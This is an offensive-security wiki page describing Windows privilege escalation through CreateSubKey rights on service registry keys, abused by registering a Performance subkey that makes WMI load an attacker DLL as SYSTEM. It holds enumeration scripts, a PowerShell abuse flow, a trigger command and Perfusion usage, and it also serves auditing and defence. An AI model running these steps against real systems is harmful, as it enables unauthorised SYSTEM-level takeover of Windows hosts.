# AppendData/AddSubdirectory Permission over Service Registry

{{#include ../../banners/hacktricks-training.md}}

**The original post is** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

## Summary

If you only have **`Create Subkey`** / **`AppendData/AddSubdirectory`** on a service registry key, this is still a good privesc lead. You usually **can't** overwrite `ImagePath`, `ServiceDll`, or other existing values directly, but you may still be able to create a **`Performance`** child key under:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Any other **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** key where your token has **`KEY_CREATE_SUB_KEY`**

The trick is that Windows still supports the legacy **PerfLib V1** registration model. If a service has a **`Performance`** subkey, Windows can load a DLL from there when a performance counter consumer requests data.

According to Microsoft documentation, the minimum registration is:

```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
  Library = C:\Path\payload.dll
  Open    = OpenPerfData
  Collect = CollectPerfData
  Close   = ClosePerfData
```

So the offensive takeaway is: **don't discard a service registry finding just because you only got `CreateSubKey` instead of `SetValue`**.

## Why this is enough for code execution

The `Performance` subkey does **not** usually exist by default on these services, so **`KEY_CREATE_SUB_KEY`** is the primitive you need. Once the key exists and contains `Library`/`Open`/`Collect`/`Close`, any **performance counter consumer** can trigger the DLL load.

A few important details:

- The **`Library`** value can point to a **full DLL path**.
- The DLL must export **`OpenPerfData`**, **`CollectPerfData`**, and **`ClosePerfData`** and return `ERROR_SUCCESS`.
- The code runs in the **consumer's context**, **not necessarily in the vulnerable service process itself**.
- In the classic `RpcEptMapper` / `Dnscache` case, a **WMI performance query** can make **`wmiprvse.exe`** load the DLL as **`NT AUTHORITY\SYSTEM`**.

This is why the primitive is easy to miss during triage: the parent service key is not "fully writable", but it is still weaponizable.

## Quick enumeration

Manual spot-check with **AccessChk**:

```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```

PowerShell example to look for low-privileged principals with **`CreateSubKey`** on service keys:

```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
  $weak = (Get-Acl $_.PSPath).Access | Where-Object {
    $_.AccessControlType -eq 'Allow' -and
    ($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
    $_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
  }
  if ($weak) {
    [pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
  }
}
```

Useful tooling:

- **PrivescCheck**: `Get-ModifiableRegistryPath` was created specifically to spot this class of issue.
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: automates DLL drop, `Performance` registration, WMI trigger, token duplication, and cleanup on legacy vulnerable targets (for example: `Perfusion.exe -c cmd -i -k Dnscache`).

## Abuse flow

Create the `Performance` subkey and populate the required values:

```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```

Then trigger a **privileged** performance consumer. A classic example is a WMI query over `Win32_Perf*` classes:

```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```

Operational notes:

- Launching **`perfmon.exe`** is useful to verify that the counter registration is correct, but that usually only loads the DLL in **your own user context**.
- For an actual LPE, trigger a **privileged** consumer such as **WMI**.
- If you are writing your own exploit, spawning `cmd.exe` directly from inside the DLL usually leaves you with a shell in **session 0**. `Perfusion` solves this by duplicating the privileged token into a process that was created suspended in the attacker's session.
- Match the DLL architecture to the target consumer (**x64 on x64 systems**).

## Version notes / recent developments

Historically, the built-in weak keys were:

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` and `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` notes that the **April 2021** updates removed the easy exploitation path on updated **Windows 8 / Windows Server 2012**, while **Windows 7 / Windows Server 2008 R2** remained exploitable through **`Dnscache`**.

This primitive is **not only historical**. In **January 2025**, Microsoft patched a related AD DS issue where members of **`Network Configuration Operators`** could create subkeys under **`Dnscache`** and **`NetBT`**, and the same **Performance-counter DLL registration** idea could be reused to reach **SYSTEM** on supported systems.

So the modern lesson is generic: whenever a low-privileged principal has **`CreateSubKey`** on **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, check whether a **`Performance`** child key is enough before dismissing the finding.

## References

- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
{{#include ../../banners/hacktricks-training.md}}
